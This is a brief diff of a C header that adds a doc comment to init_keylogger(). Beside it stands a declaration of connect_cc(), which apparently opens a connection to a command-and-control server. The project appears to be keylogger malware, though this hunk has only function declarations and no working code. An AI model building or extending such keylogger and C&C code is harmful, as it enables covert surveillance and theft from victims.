@@ -22,6 +22,11 @@ struct sockaddr_in;
 int connect_cc(char *ip_adrr, int port, int *socket_desc,
 	       struct sockaddr_in *server, int isTCP);
 
+/** 
+ * Inits the keylogger
+ * 
+ * Returns - OK or ERROR
+*/
 int init_keylogger();
 
 /** 
